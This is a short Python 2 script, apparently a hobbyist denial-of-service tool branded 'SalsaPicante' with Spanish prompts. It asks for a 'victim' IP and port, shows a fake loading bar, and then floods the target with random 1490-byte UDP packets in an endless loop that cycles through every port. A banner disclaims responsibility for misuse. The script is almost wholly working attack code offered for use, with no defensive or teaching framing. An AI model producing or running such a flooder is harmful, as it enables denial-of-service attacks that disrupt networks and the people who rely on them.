import sys
import os
import time
import socket
import random
import colorama
from colorama import Fore,Back,init
init()
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#
Gris='\033[1;30m'
Cian='\033[1;36m'
sub='\033[4m'
Rojo='\033[31m'
Verde='\033[32m'
Amarillo='\033[33m'
Azul='\033[34m'
Morado='\033[35m'
Blanco='\033[37m'
#

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

banner = Morado+"""
  /$$$$$$            /$$                     /$$$$$$$  /$$                                 /$$               /$$$$$$$  /$$$$$$$                     
 /$$__  $$          | $$                    | $$__  $$|__/                                | $$              | $$__  $$| $$__  $$                    
| $$  \__/  /$$$$$$ | $$  /$$$$$$$  /$$$$$$ | $$  \ $$ /$$  /$$$$$$$  /$$$$$$  /$$$$$$$  /$$$$$$    /$$$$$$ | $$  \ $$| $$  \ $$  /$$$$$$   /$$$$$$$
|  $$$$$$  |____  $$| $$ /$$_____/ |____  $$| $$$$$$$/| $$ /$$_____/ |____  $$| $$__  $$|_  $$_/   /$$__  $$| $$  | $$| $$  | $$ /$$__  $$ /$$_____/
 \____  $$  /$$$$$$$| $$|  $$$$$$   /$$$$$$$| $$____/ | $$| $$        /$$$$$$$| $$  \ $$  | $$    | $$$$$$$$| $$  | $$| $$  | $$| $$  \ $$|  $$$$$$ 
 /$$  \ $$ /$$__  $$| $$ \____  $$ /$$__  $$| $$      | $$| $$       /$$__  $$| $$  | $$  | $$ /$$| $$_____/| $$  | $$| $$  | $$| $$  | $$ \____  $$
|  $$$$$$/|  $$$$$$$| $$ /$$$$$$$/|  $$$$$$$| $$      | $$|  $$$$$$$|  $$$$$$$| $$  | $$  |  $$$$/|  $$$$$$$| $$$$$$$/| $$$$$$$/|  $$$$$$/ /$$$$$$$/
 \______/  \_______/|__/|_______/  \_______/|__/      |__/ \_______/ \_______/|__/  |__/   \___/   \_______/|_______/ |_______/  \______/ |_______/
                     -=>-------SalsaPicante-------<=-
 NO NOS HACEMOS RESPONSABLES POR EL MAL USO QUE LE DEN AL USAR ESTA HERRAMIENTA """
menu = Amarillo+"------------------------------------------------------------------------------"
os.system("clear")
print (banner)
ip = raw_input("IP de la victim : ")
port = input("Port : ")
print("Loading")
print ("[                    ] 0% ")
time.sleep(2)
print ("[=====               ] 25%")
time.sleep(1)
print ("[==========          ] 50%")
time.sleep(2)
print ("[===============     ] 75%")
time.sleep(3)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

